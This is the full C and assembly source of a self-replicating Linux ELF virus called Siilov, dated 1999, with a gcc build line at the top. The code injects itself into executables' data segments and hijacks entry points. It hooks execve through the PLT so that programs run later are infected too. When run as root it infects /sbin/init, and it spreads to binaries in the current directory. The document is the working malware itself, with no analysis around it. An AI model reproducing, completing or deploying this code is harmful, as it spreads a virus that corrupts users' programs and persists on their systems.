   /*
       THE SILLOV VIRUS

       - Silvio Cesare <silvio@big.net.au>
       - http://www.big.net.au/~silvio
       - http://virus.beergrave.net
       - December 1999

       gcc siilov-src.c -o siilov.bin -O2 -nostdlib
   */

   #include <linux/types.h>
   #include <asm/unistd.h>
   #include <linux/fcntl.h>
   #include <linux/mman.h>
   #include <linux/dirent.h>
   #include <elf.h>

   /* stdio. normally has these, but where trying to avoid libc */

   #define SEEK_SET        0
   #define SEEK_CUR        1
   #define SEEK_END        2

   struct stat {
           dev_t st_dev;                     /* Device.  */
           unsigned short int __pad1;
           ino_t st_ino;                     /* File serial number.  */
           mode_t st_mode;                   /* File mode.  */
           nlink_t st_nlink;                 /* Link count.  */
           uid_t st_uid;                     /* User ID of the file's owner. */
           gid_t st_gid;                     /* Group ID of the file's group.*/
           dev_t st_rdev;                    /* Device number, if device.  */
           unsigned short int __pad2;
           off_t st_size;                    /* Size of file, in bytes.  */
           unsigned long int st_blksize;       /* Optimal block size for I/O.  */
           unsigned long int st_blocks;        /* Number of 512-byte blocks allocated.
    */
           time_t st_atime;                  /* Time of last access.  */
           unsigned long int __unused1;
           time_t st_mtime;                  /* Time of last modification.  */
           unsigned long int __unused2;
           time_t st_ctime;                  /* Time of last status change.  */
           unsigned long int __unused3;
           unsigned long int __unused4;
           unsigned long int __unused5;
   };

   /*
           Remember, we cant use libc even for things like open, close etc

           New __syscall macros are made so not to use errno which are just
           modified _syscall routines from asm/unistd.h
   */

   #define __syscall0(type,name) \
   type _##name(void) \
   { \
   long __res; \
   __asm__ volatile ("int $0x80" \
           : "=a" (__res) \
           : "0" (__NR_##name)); \
           return (type) __res; \
   }

   #define __syscall1(type,name,type1,arg1) \
   type _##name(type1 arg1) \
   { \
   long __res; \
   __asm__ volatile ("int $0x80" \
           : "=a" (__res) \
           : "0" (__NR_##name),"b" ((long)(arg1))); \
           return (type) __res; \
   }

   #define __syscall2(type,name,type1,arg1,type2,arg2) \
   type _##name(type1 arg1,type2 arg2) \
   { \
   long __res; \
   __asm__ volatile ("int $0x80" \
           : "=a" (__res) \
           : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
           return (type) __res; \
   }

   #define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
   type _##name(type1 arg1,type2 arg2,type3 arg3) \
   { \
   long __res; \
   __asm__ volatile ("int $0x80" \
           : "=a" (__res) \
           : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
                   "d" ((long)(arg3))); \
           return (type) __res; \
   }

   void *_malloc(int);
   void _free(void *);

   #define DATA_ENTRY_POINT    0

   #define ORIG_ENTRY_POINT    0
   #define ORIG_PLT_ADDR       1
   #define PLT_ADDR        2
   #define USE_PLT         3
   #define STORE           4

   #define VIRUS_LENGTH    (virendall - virstart)
   #define CHAIN_LENGTH    (virchend - virchstart)
   #define PAGE_SIZE   4096
   #define PAGE_MASK   (PAGE_SIZE - 1)

   typedef struct {
           Elf32_Ehdr      ehdr;
           Elf32_Phdr*     phdr;
           Elf32_Shdr*     shdr;
       int     plen;
           char**          section;
       char*       string;
           int             bss;
   } bin_t;

   void virstart(void);
   void virchend(void);
   void virchstart(void);
   long *getvirchdata(void);
   long *getvirdata(void);
   int plt_execve(const char *, const char *[], const char *[]);
   int init_virus(int, int, int, int, bin_t *);
   void virendall(void);
   char *get_virus(void);

   void virfunc(void)
   {
   __asm__("
   .globl L1
       .type virstart,@function
   virstart:
       pushl %eax
       pushl %ebx
       pushl %ecx
       pushl %edx

       call virmain
   virmain:
       popl %esi               #
       addl $(virdata - virmain),%esi      # movl $virdata,%esi

       cmpl $0,use_plt - virdata(%esi)
       jz skip_plt

   # this can be converted to C but should we bother?

       movl plt_addr - virdata(%esi),%ebx  #
       movl (%ebx),%ecx            #
       movl %ecx,orig_plt_addr - virdata(%esi) # movl plt_addr,orig_plt_addr

       movl %esi,%ebx              #
       subl $(virdata - plt_execve),%ebx   #
       movl plt_addr - virdata(%esi),%ecx  #
       movl %ebx,(%ecx)            # movl $plt_execve,plt_addr

   skip_plt:
       movl $125,%eax
       movl orig_entry_point - virdata(%esi),%ebx
       movl %ebx,%edi              # for later
       andl $~4095,%ebx
       movl $8192,%ecx
       movl $7,%edx
       int $0x80

       pushl %edi
       leal store - virdata(%esi),%esi
       movl $(virchend - virchstart),%ecx
       rep
       movsb

       call _vstart

       popl %edi
       popl %edx
       popl %ecx
       popl %ebx
       popl %eax

       jmp *%edi

   .globl getvirdata
       .type getvirdata,@function
   getvirdata:
       pushl %ebp
       movl %esp,%ebp

       call getvirdatamain

   getvirdatamain:
       popl %eax               #
       addl $(virdata - getvirdatamain),%eax   # movl $virdata,%eax

       movl %ebp,%esp
       popl %ebp

       ret

   virdata:

   orig_entry_point:
   .long 0

   orig_plt_addr:
   .long 0

   plt_addr:
   .long 0

   use_plt:
   .long 0

   store:
       .zero virchend - virchstart

   ");
   /*
       we have a little wasted space here from cleaning up the stack frame
       in the wrapper function.
   */
   }

   inline __syscall1(int, exit, int, status);
   inline __syscall1(unsigned long, brk, unsigned long, brk);
   inline __syscall2(int, fstat, int, fd, struct stat *, buf);
   inline __syscall1(int, unlink, const char *, pathname);
   inline __syscall3(int, fchown, int, fd, uid_t, owner, gid_t, group);
   inline __syscall2(int, rename, const char *, oldpath, const char *, newpath);
   inline __syscall3(int, open, const char *, file, int, flag, int, mode);
   inline __syscall1(int, close, int, fd);
   inline __syscall3(off_t, lseek, int, filedes, off_t, offset, int, whence);
   inline __syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);
   inline __syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
   inline __syscall3(int, mprotect, caddr_t, addr, size_t, len, int, prot);
   inline __syscall3(int, getdents, int, fd, struct dirent *, dirp, int, count);
   inline __syscall0(int, geteuid);

   static char id[] =
       "Siilov, Decemeber 1999, Silvio Cesare <silvio@big.net.au>"
   ;

   /*
       a pseduo data segment for various strings (remmeber, we have to be
       relocateable)
   */

   #define ORIGINAL_BRK    0
   #define TEMPNAME    4
   #define EXECVE      12
   #define SEC_STRING  19
   #define REL_PLT     26
   #define DOT     35
   #define INIT        37

   char *getdataseg(void)
   {
   __asm__("
       call datasegreloc
   datasegreloc:
       popl %eax
       addl $(dataseg - datasegreloc),%eax
       jmp skipdataseg
   dataseg:
   .long 0
   .string \"vXXXXXX\"
   .string \"execve\"
   .string \".data1\"
   .string \".rel.plt\"
   .string \".\"
   .string \"/sbin/init\"
   skipdataseg:
   ");
   }

   /*
       this can be coded in asm but should we? (though its faster and smaller)
   */

   int orig_plt_func(const char *filename, const char *argv[], const char *envp[])
   {
       long *data = getvirdata();
       int (*f)(const char *, const char *[], const char *[]);
       int ret;

       f = (void *)(*(long *)data[PLT_ADDR] = data[ORIG_PLT_ADDR]);
       ret = f(filename, argv, envp);
   /*  data[ORIG_PLT_ADDR] = *(long *)data[PLT_ADDR];

       the following line doesnt compile very nicely as it doesnt shortcut
       the subtraction

       *(long *)data[PLT_ADDR] = (long)&((char *)data)[
           (long)plt_execve - (long)virdata
       ];
   */  return ret;
   }

   int plt_execve(const char *filename, const char *argv[], const char *envp[])
   {
       try_infect(filename);
       return orig_plt_func(filename, argv, envp);
   }

   void virchfunc(void)
   {
   __asm__("
   .globl virchstart
       .type virchstart,@function
   virchstart:
       call virchmain
   virchmain:
       popl %esi               #
       addl $(virchdata - virchmain),%esi  # movl $virdata,%esi

       movl data_entry_point - virchdata(%esi),%edi
                           # movl data_entry_point,%edi
       jmp *%edi

   .globl getvirchdata
       .type getvirchdata,@function
   getvirchdata:

       pushl %ebp
       movl %esp,%ebp

       call virchreloc
   virchreloc:
       popl %eax
       addl $(virchdata - virchreloc),%eax

       movl %ebp,%esp
       popl %ebp
       ret

   virchdata:

   .globl data_entry_point
       .size data_entry_point,4
       .type data_entry_point,@object
   data_entry_point:
   .long 0

   .globl virchend
       .type virchend,@function
   virchend:
   ");
   }

   char *get_virus(void)
   {
       return (char *)((long)getvirdata() - 130);
   }

   void _memcpy(void *dst, void *src, int len)
   {
       char *p, *q;
       int i;

       p = src;
       q = dst;
       for (i = 0; i < len; i++) *q++ = *p++;
   }

   int _strcmp(const char *p, const char *q)
   {
       while (*p && *q) {
           if (*p != *q) return 1;
           ++p;
           ++q;
       }
       return *p != *q;
   }

   int init_virus(
       int plt, int data_start, int data_memsz, int entry, bin_t *bin
   )
   {
       long code_start = data_start + data_memsz;
       long *chdata, *data;
       int i;
       long _virchstart;

       chdata = getvirchdata();
       _virchstart = (long)chdata - 38;
       chdata[DATA_ENTRY_POINT] = code_start;
       data = getvirdata();
       data[ORIG_ENTRY_POINT] = entry;
       if (plt == -1) {
           data[USE_PLT] = 0;
       } else {
           data[USE_PLT] = 1;
           data[PLT_ADDR] = plt;
       }
       for (i = 0; i < bin->bss; i++) {
           long vaddr = bin->shdr[i].sh_addr;

           if (entry >= vaddr && entry < (vaddr + bin->shdr[i].sh_size)) {
               char *p = &bin->section[i][entry - vaddr];

               _memcpy(&data[STORE], p, CHAIN_LENGTH);
               _memcpy(p, (char *)_virchstart, CHAIN_LENGTH);
               break;
           }
       }
       return 0;
   }

   int do_elf_checks(Elf32_Ehdr *ehdr)
   {
       return (
           ehdr->e_ident[0] != ELFMAG0 ||
           ehdr->e_ident[1] != ELFMAG1 ||
           ehdr->e_ident[2] != ELFMAG2 ||
           ehdr->e_ident[3] != ELFMAG3 ||
           ehdr->e_type != ET_EXEC ||
           (ehdr->e_machine != EM_386 && ehdr->e_machine != EM_486) ||
           ehdr->e_version != EV_CURRENT
       );
   }


   int do_dyn_symtab(
       int fd,
       Elf32_Shdr *shdr, Elf32_Shdr *shdrp,
       const char *sh_function
   )
   {
       Elf32_Shdr *strtabhdr = &shdr[shdrp->sh_link];
       char *string;
       Elf32_Sym *sym, *symp;
       int i;

       string = (char *)_malloc(strtabhdr->sh_size);
       if (string == NULL) goto error;
       if (_lseek(
           fd, strtabhdr->sh_offset, SEEK_SET) != strtabhdr->sh_offset
       ) goto string_error;
       if (_read(fd, string, strtabhdr->sh_size) != strtabhdr->sh_size)
           goto string_error;
       sym = (Elf32_Sym *)_malloc(shdrp->sh_size);
       if (sym == NULL) goto string_error;
       if (_lseek(fd, shdrp->sh_offset, SEEK_SET) != shdrp->sh_offset)
           goto sym_error;
       if (_read(fd, sym, shdrp->sh_size) != shdrp->sh_size) goto sym_error;
       symp = sym;
       for (i = 0; i < shdrp->sh_size; i += sizeof(Elf32_Sym)) {
           if (!_strcmp(&string[symp->st_name], sh_function)) {
               _free(sym);
               _free(string);
               return symp - sym;
           }
           ++symp;
       }
   sym_error:
       _free(sym);
   string_error:
       _free(string);
   error:
       return -1;
   }

   int get_sym_number(
       int fd, Elf32_Ehdr *ehdr, Elf32_Shdr *shdr, const char *sh_function
   )
   {
       Elf32_Shdr *shdrp = shdr;
       int i;

       for (i = 0; i < ehdr->e_shnum; i++) {
           if (shdrp->sh_type == SHT_DYNSYM)
               return do_dyn_symtab(fd, shdr, shdrp, sh_function);
           ++shdrp;
       }
   }

   int do_rel(int fd, Elf32_Shdr *shdr, int sym)
   {
       Elf32_Rel *rel, *relp;
       int i;

       rel = (Elf32_Rel *)_malloc(shdr->sh_size);
       if (rel == NULL) goto error;
       if (_lseek(fd, shdr->sh_offset, SEEK_SET) != shdr->sh_offset)
           goto rel_error;
       if (_read(fd, rel, shdr->sh_size) != shdr->sh_size) goto rel_error;
       relp = rel;
       for (i = 0; i < shdr->sh_size; i += sizeof(Elf32_Rel)) {
           if (ELF32_R_SYM(relp->r_info) == sym) {
               long offset = relp->r_offset;

               _free(rel);
               return offset;
           }
           ++relp;
       }
   rel_error:
       _free(rel);
   error:
       return -1;
   }

   int find_rel(
       int fd,
       const char *string,
       Elf32_Ehdr *ehdr, Elf32_Shdr *shdr,
       const char *sh_function
   )
   {
       Elf32_Shdr *shdrp = shdr;
       int sym;
       int i;

       sym = get_sym_number(fd, ehdr, shdr, sh_function);
       if (sym < 0) return -1;
       for (i = 0; i < ehdr->e_shnum; i++) {
           if (!_strcmp(&string[shdrp->sh_name], &getdataseg()[REL_PLT]))
               return do_rel(fd, shdrp, sym);
           ++shdrp;
       }
       return -1;
   }

   int load_section(char **section, int fd, Elf32_Shdr *shdr)
   {
           if (_lseek(fd, shdr->sh_offset, SEEK_SET) < 0) return -1;
           *section = (char *)_malloc(shdr->sh_size);
           if (*section == NULL) return -1;
           if (_read(fd, *section, shdr->sh_size) != shdr->sh_size) {
           _free(*section);
           return -1;
       }
       return 0;
   }

   int load_bin(int fd, bin_t *bin, const char *newsecstr)
   {
           char **sectionp;
           Elf32_Ehdr *ehdr;
           Elf32_Shdr *shdr;
           int slen;
       Elf32_Shdr *strtabhdr;
           int i;

           ehdr = &bin->ehdr;
           if (_read(fd, ehdr, sizeof(Elf32_Ehdr)) != sizeof(Elf32_Ehdr))
           goto error;
           if (do_elf_checks(ehdr)) goto error;
           bin->phdr = (Elf32_Phdr *)_malloc(
           bin->plen = sizeof(Elf32_Phdr)*ehdr->e_phnum
       );
           if (bin->phdr == NULL) goto error;
           if (_lseek(fd, ehdr->e_phoff, SEEK_SET) < 0) goto phdr_error;
           if (_read(fd, bin->phdr, bin->plen) != bin->plen) goto phdr_error;
           slen = sizeof(Elf32_Shdr)*ehdr->e_shnum;
           bin->shdr = (Elf32_Shdr *)_malloc(slen);
           if (bin->shdr == NULL) goto phdr_error;
           bin->section = (char **)_malloc(sizeof(char **)*ehdr->e_shnum);
           if (bin->section == NULL) goto shdr_error;
           if (_lseek(fd, ehdr->e_shoff, SEEK_SET) < 0) goto section_error;
           if (_read(fd, bin->shdr, slen) != slen) goto section_error;
       strtabhdr = &bin->shdr[ehdr->e_shstrndx];
       bin->string = (char *)_malloc(strtabhdr->sh_size);
       if (bin->string == NULL) goto section_error;
       if (_lseek(
           fd, strtabhdr->sh_offset, SEEK_SET
       ) != strtabhdr->sh_offset) goto string_error;
       if (_read(fd, bin->string, strtabhdr->sh_size) != strtabhdr->sh_size)
           goto string_error;
   /*
       virus detection is simple. if the .data1 section exists, skip.
   */
       shdr = bin->shdr;
       for (i = 0; i < ehdr->e_shnum; i++) {
           if (!_strcmp(&bin->string[shdr[i].sh_name], newsecstr))
               goto already_infected;
       }
       bin->bss = -1;
           for (
                   i = 0, sectionp = bin->section;
                   i < ehdr->e_shnum;
                   i++, sectionp++
           ) {
           if (shdr[i].sh_type == SHT_NOBITS) bin->bss = i;
           else if (load_section(sectionp, fd, &shdr[i]) < 0)
               goto asection_error;
           }
       if (bin->bss < 0) goto asection_error;
           return 0;
   asection_error:
       for (--i; i >= 0; i--,sectionp--) _free(*sectionp);
   already_infected:
   string_error:
       _free(bin->string);
   section_error:
       _free(bin->section);
   shdr_error:
       _free(bin->shdr);
   phdr_error:
       _free(bin->phdr);
   error:
       return -1;
   }

   void free_bin(bin_t *bin)
   {
       int i;

       _free(bin->phdr);
       _free(bin->shdr);
       for (i = 0; i < bin->ehdr.e_shnum; i++)
           _free(bin->section[i]);
       _free(bin->section);
   }

   void memzero(char *ptr, int len)
   {
       int i;
       for (i = 0; i < len; i++) ptr[i] = 0;
   }

   int _strlen(const char *str)
   {
       const char *p;

       for (p = str; *p; ++p);
       return p - str;
   }

   /*
       the most dodgy malloc implementation in existance. its simple and its
       tiny however.
   */

   void malloc_init(void)
   {
       unsigned char *p = &getdataseg()[ORIGINAL_BRK];
       unsigned long b = _brk(0);

       p[0] = b & 255;
       p[1] = (b >> 8) & 255;
       p[2] = (b >> 16) & 255;
       p[3] = (b >> 24);
   }

   void *_malloc(int size)
   {
       long b;

       b = _brk(0);
       if (_brk(b + size) < 0) return NULL;
       return (void *)b;
   }

   void _free(void *ptr)
   {
   }

   void freeall(void)
   {
       unsigned char *p = &getdataseg()[ORIGINAL_BRK];
       unsigned long b = p[0] + (p[1] << 8) + (p[2] << 16) + (p[3] << 24);

       _brk(b);
   }

   int try_infect(char *host)
   {
       Elf32_Phdr *phdr;
       Elf32_Shdr *shdr;
       int move = 0;
       int out = -1, in = -1;
       int evaddr, text_start = -1, plt;
       int bss_len, addlen, addlen2, addlen3;
       int offset, pos, oshoff;
       int i, j;
       char null = 0;
       struct stat st_buf;
       bin_t bin;
       Elf32_Shdr newshdr;
       char *zero;
       char *data = getdataseg();
       char *tempname = &data[TEMPNAME];
       char *DEBUG_STRING = &data[SEC_STRING];

       in = _open(host, O_RDONLY, 0);
       if (in < 0) goto error;
       if (load_bin(in, &bin, DEBUG_STRING) < 0) goto error;
       plt = find_rel(
           in,
           bin.string,
           &bin.ehdr, bin.shdr,
           &data[EXECVE]
       );
       phdr = bin.phdr;
       for (i = 0; i < bin.ehdr.e_phnum; i++) {
           if (phdr->p_type == PT_LOAD) {
               if (phdr->p_offset == 0) {
                   text_start = phdr->p_vaddr;
               } else {
                   if (text_start < 0) goto bin_error;
   /* is this the data segment ? */
                   offset = phdr->p_offset + phdr->p_filesz;
                   bss_len = phdr->p_memsz - phdr->p_filesz;
                   if (init_virus(
                       plt,
                       phdr->p_vaddr,
                       phdr->p_memsz,
                       bin.ehdr.e_entry,
                       &bin
                   ) < 0) goto bin_error;
                   break;
               }
           }
           ++phdr;
       }
       addlen = VIRUS_LENGTH + bss_len;
   /*
       update the phdr's to reflect the extention of the data segment (to
       allow virus insertion)
   */
       phdr = bin.phdr;
       for (i = 0; i < bin.ehdr.e_phnum; i++) {
           if (phdr->p_type != PT_DYNAMIC) {
               if (move) {
                   phdr->p_offset += addlen;
               } else if (phdr->p_type == PT_LOAD && phdr->p_offset) {
   /* is this the data segment ? */
                   phdr->p_filesz += addlen;
                   phdr->p_memsz += addlen;
                   move = 1;
               }
           }
           ++phdr;
       }
           if (_fstat(in, &st_buf) < 0) goto bin_error;

   /* write the new virus */
   /*  if (mktemp(tempname) == NULL) goto bin_error;
   */
       out = _open(tempname, O_WRONLY | O_CREAT | O_EXCL, st_buf.st_mode);
       if (out < 0) goto bin_error;
       addlen2 = addlen + _strlen(DEBUG_STRING);
       addlen3 = addlen2 + sizeof(Elf32_Shdr);
       bin.ehdr.e_shoff += addlen2;
       ++bin.ehdr.e_shstrndx;
       ++bin.ehdr.e_shnum;
       if (_write(out, &bin.ehdr, sizeof(Elf32_Ehdr)) != sizeof(Elf32_Ehdr))
           goto cleanup;
   /*
       we use the ehdr later on
   */
       --bin.ehdr.e_shnum;
       --bin.ehdr.e_shstrndx;
       if (_write(out, bin.phdr, bin.plen) != bin.plen) goto cleanup;
       for (i = 0; i < bin.bss; i++) {
           if (_lseek(out, bin.shdr[i].sh_offset, SEEK_SET) < 0)
               goto cleanup;
           if (_write(
               out, bin.section[i], bin.shdr[i].sh_size
           ) != bin.shdr[i].sh_size)
               goto cleanup;
       }
       zero = (char *)_malloc(bss_len);
       if (zero == NULL) goto cleanup;
       memzero(zero, bss_len);
       if (_write(out, zero, bss_len) != bss_len) goto zero_error;
       _free(zero);
       if (_write(out, get_virus(), VIRUS_LENGTH) != VIRUS_LENGTH)
           goto cleanup;
       for (++i; i <= bin.ehdr.e_shstrndx; i++) {
           if (_lseek(out, addlen + bin.shdr[i].sh_offset, SEEK_SET) < 0)
               goto cleanup;
           if (_write(
               out, bin.section[i], bin.shdr[i].sh_size
           ) != bin.shdr[i].sh_size) goto cleanup;
       }
       if (_write(
           out, DEBUG_STRING, _strlen(DEBUG_STRING)
       ) != _strlen(DEBUG_STRING)) goto cleanup;
       if (_lseek(out, bin.ehdr.e_shoff, SEEK_SET) < 0) goto zero_error;
       for (i = 0; i < bin.bss; i++)
           if (_write(
               out, &bin.shdr[i], sizeof(Elf32_Shdr)
           ) != sizeof(Elf32_Shdr)) goto cleanup;
       newshdr.sh_name = bin.shdr[bin.ehdr.e_shstrndx].sh_size;
       newshdr.sh_type = SHT_PROGBITS;
       newshdr.sh_flags = SHF_ALLOC | SHF_WRITE;
       newshdr.sh_addr = bin.shdr[i].sh_addr;
       newshdr.sh_offset = offset;
       newshdr.sh_size = addlen;
       newshdr.sh_link = 0;
       newshdr.sh_info = 0;
       newshdr.sh_addralign = 0;
       newshdr.sh_entsize = 0;
       if (_write(out, &newshdr, sizeof(Elf32_Shdr)) != sizeof(Elf32_Shdr))
           goto cleanup;
       for (j = 0; j < bin.ehdr.e_shnum; j++)
           if (bin.shdr[j].sh_link > i) ++bin.shdr[j].sh_link;
       bin.shdr[i].sh_offset += addlen;
       bin.shdr[i].sh_addr += addlen;
       bin.shdr[i].sh_size = 0;
       if (_write(
           out, &bin.shdr[i], sizeof(Elf32_Shdr)
       ) != sizeof(Elf32_Shdr)) goto cleanup;
       for (++i; i < bin.ehdr.e_shstrndx; i++) {
           bin.shdr[i].sh_offset += addlen;
           if (_write(
               out, &bin.shdr[i], sizeof(Elf32_Shdr)
           ) != sizeof(Elf32_Shdr)) goto cleanup;
       }
       bin.shdr[i].sh_size += _strlen(DEBUG_STRING);
       bin.shdr[i].sh_offset += addlen;
       if (_write(
           out, &bin.shdr[i], sizeof(Elf32_Shdr)
       ) != sizeof(Elf32_Shdr)) goto cleanup;
       for (++i; i < bin.ehdr.e_shnum; i++) {
           bin.shdr[i].sh_offset += addlen3;
           if (_write(
               out, &bin.shdr[i], sizeof(Elf32_Shdr)
           ) != sizeof(Elf32_Shdr)) goto cleanup;
       }
       for (i = bin.ehdr.e_shstrndx + 1; i < bin.ehdr.e_shnum; i++) {
   /*
       we've already added to the offset
   */
           if (_lseek(out, bin.shdr[i].sh_offset, SEEK_SET) < 0)
               goto cleanup;
           if (_write(
               out, bin.section[i], bin.shdr[i].sh_size
           ) != bin.shdr[i].sh_size) goto cleanup;
       }
       if (_rename(tempname, host) < 0) goto cleanup;
       if (_fchown(out, st_buf.st_uid, st_buf.st_gid) < 0) goto bin_error;
       free_bin(&bin);
       _close(in);
       _close(out);
       return 0;
   zero_error:
       _free(zero);
   cleanup:
       _unlink(tempname);
   bin_error:
       free_bin(&bin);
   error:
       _close(in);
       _close(out);
       return -1;
   }

   #define TRY_LIMIT   10

   void _vstart(void)
   {
       int ret;
       char d[8192];
       struct dirent *dirp = (struct dirent *)d;
       int dd = -1;
       int n;
       int numd;
       int i, infect, r;
       char *data = getdataseg();

       malloc_init();
       if (_geteuid() == 0) try_infect(&data[INIT]);
       dd = _open(&data[DOT], O_RDONLY, 0);
       if (dd < 0) goto cleanup;
       n = _getdents(dd, dirp, sizeof(d));
       if (n < 0) goto cleanup;
       infect = 0;
       for (
           i = 0, r = 0;
           r < n;
           dirp = (struct dirent *)&d[r += dirp->d_reclen]
       ) {
           if (i > TRY_LIMIT && infect) break;
           if (try_infect(dirp->d_name) == 0) ++infect;
       }
   cleanup:
       _close(dd);
       freeall();
   }

   void virendall(void)
   {
   }

   void _start(void)
   {
       if (_mprotect(
           (void *)((long)virstart & (~PAGE_MASK)),
           PAGE_SIZE << 1,
           PROT_READ | PROT_WRITE | PROT_EXEC
       ) < 0) goto error;
       _vstart();
   error:
       _exit(0);
   }
